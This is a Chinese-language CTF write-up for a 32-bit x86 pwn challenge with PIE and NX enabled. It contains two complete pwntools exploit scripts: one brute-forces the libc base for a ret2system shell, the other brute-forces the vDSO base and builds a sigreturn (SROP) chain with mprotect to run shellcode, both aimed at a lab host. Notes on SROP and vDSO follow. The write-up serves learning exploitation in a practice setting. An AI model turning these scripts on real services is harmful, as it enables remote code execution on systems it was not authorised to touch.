(ps：x86_pie&x86_srop入门题)
文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA 
提取码：4olb 
环境搭建：
1.查看文件信息及保护机制
got表只读，NX，PIE都开了
2.ubuntu运行ida*32远程调试文件，打开ida32对程序进行分析
函数窗口中未发现可以函数，打开main函数，发现只有一个read函数，并且可以栈溢出。
3.远程调试，断点于main函数第一行，运行
4.
看到程序运行后，ida中的模块窗口出现这些，则有：
一.根据pie的特性，最后12位不变，多次加载程序后，发现libc的基址前三位也是不变，也
就是只需爆破8位即可
二.可以通过上述方法进行爆破vdso地址，与上面不同的是，vdso的地址第三位是可变的，
有时是E有时是F。然后进行srop
5.
这里有个坑（如果是新手），就是ida上模块中的libc文件名，并不是题目中给出的libc文
件，而是以实际程序调用的libc文件为准。
可以看到题目给出的libc文件和程序实际加载的libc文件是不一样的(由于是用本地系统搭建
pwn题环境)，地址也理所当然的不一样，所以（本地搭建环境）一定要看清楚程序到底用
哪个libc文件
6.
①爆破libc的exp：
（亦可直接覆盖返回地址的后3字节->6位16进制数，来爆破one_gadget）
1
from pwn import *
2
3
context.binary = './233'
4
5
6
libc_start = 0xf7d56000 #guess_start_address
7
#one_gadget_add = libc_start + 0x3af1c
8
system_add = libc_start + 0x3a940
9
shell = libc_start + 0x15902b
10
11
while True:
12
 try:
13
 link = remote("192.168.93.137","6666")
14
 #payload = 'A' * 0x16 + p32(one_gadget_add)
15
 payload = 'A' * 0x16
16
 payload += p32(system_add)
17
 payload +=p32(0)
18
 payload += p32(shell)
19
 link.send(payload)
20
 link.recv(timneout=1)
21
 except EOFError:
22
 link.close()
23
 continue
24
 link.interactive()
执行爆破脚本getshell 拿flag
②爆破vdso，进行SROP，exp：
1
from pwn import *
2
3
context.binary = './233'
4
5
global link
6
7
shellcode = asm(shellcraft.i386.linux.sh(),arch='i386')
8
vdso_add = 0xf7f17000
9
#ldd或者ida打开程序
10
#vdso 前几位都大几率是0xf7f
11
#再结合pie最后12位不变
12
#vdso也是只需爆破8位
13
int_80_add = vdso_add + 0xde6
14
sigreturn_add = vdso_add + 0xde1 #mov eax,0x77 int 80
15
int_80_pop3_ret = vdso_add + 0xdc7
16
can_write_add = vdso_add ‐ 0x4000
17
i=0
18
19
def send_no_line(str):
20
 return link.send(str)
21
22
def stack_overflow(ropchain):
23
 payload = 'A' * 0x16 + ropchain
24
 payload = payload.ljust(0x400,'A') #？？？？？？？？？？？
25
 send_no_line(payload)
26
 return
27
28
def srop():
29
 payload = 3 * 'AAAA' + p32(sigreturn_add)
30
 frame1 = SigreturnFrame(kernel='amd64')
31
 frame1.eax = constants.SYS_read
32
 frame1.ebx = 0
33
 frame1.ecx = can_write_add + 0x200
34
 frame1.edx = len(shellcode)
35
 frame1.eip = int_80_pop3_ret
36
 frame1.esp = can_write_add
37
 frame1.esp += len(payload)
38
 frame1.esp += len(SigreturnFrame(kernel='amd64'))
39
 payload += str(frame1)
40
 payload += 3 * 'AAAA' + p32(sigreturn_add)
41
 frame2 = SigreturnFrame(kernel='amd64')
42
 frame2.eax = constants.SYS_mprotect
43
 frame2.ebx = can_write_add
44
 frame2.ecx = 0x1000
45
 frame2.edx = 7
46
 frame2.eip = int_80_pop3_ret
47
 frame2.esp = can_write_add
48
 frame2.esp += len(payload)
49
 frame2.esp += len(SigreturnFrame(kernel='amd64'))
50
 payload += str(frame2)
51
 payload += 3 * 'AAAA' + p32(can_write_add + 0x200)
52
 frame3 = SigreturnFrame(kernel='amd64')
53
 frame3.eax = constants.SYS_read
54
 frame3.ebx = 0
55
 frame3.ecx = can_write_add
56
 frame3.edx = len(payload)
57
 frame3.esp = can_write_add
58
 frame3.eip = int_80_pop3_ret
59
 payload2 = p32(sigreturn_add) + str(frame3)
60
 stack_overflow(payload2)
61
 send_no_line(payload)
62
 send_no_line(shellcode)
63
 try:
64
 link.recv(timeout=1)
65
 link.recv(timeout=1)
66
 except EOFError:
67
 return 0
68
 else:
69
 return 1
70
71
while True:
72
 i+=1
73
 print i
74
 link = remote("192.168.93.137","6666")
75
 test = srop()
76
 if test == 1:
77
 link.interactive()
78
 break
79
 else:
80
 link.close()
81
 continue
82
83
整体流程：栈溢出-> sigreturn 系统调用 -> 劫持栈 -> 写入payload 和 shellcode 到新栈
中（注意上下文的frame的esp设置和eip的设置） -> 更改新栈权限 ，并且跳转到新栈的
shellcode位置执行 getshell  
(一)SROP基础学习：
1.https://www.anquanke.com/post/id/85810
2.https://bestwing.me/stack-overflow-three-SROP.html
（2）
vDSO是一种内核机制，用于将精心选择的一组内核空间例程导出到用户空间应
用程序，以便应用程序可以在进程中调用这些内核空间例程，而不会导致在调用这些
内核空间时固有的上下文切换的性能损失通过系统调用接口的例程。
VDSO就是Virtual Dynamic Shared Object，就是内核提供的虚拟的.so,这
个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时
候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。比如
syscall()这个函数就是在linux-vdso.so.1里头的，但是磁盘上并没有对应的文件.可以
通过ldd/bin/bash看看。
可以将vdso看成一个shared objdect file（这个文件实际上不存在）,内核将其
映射到某个地址空间，被所有程序所共享。（我觉得这里用到了一个技术：多个虚拟
页面映射到同一个物理页面。即内核把vdso映射到某个物理页面上，然后所有程序
都会有一个页表项指向它，以此来共享，这样每个程序的vdso地址就可以不相同
了）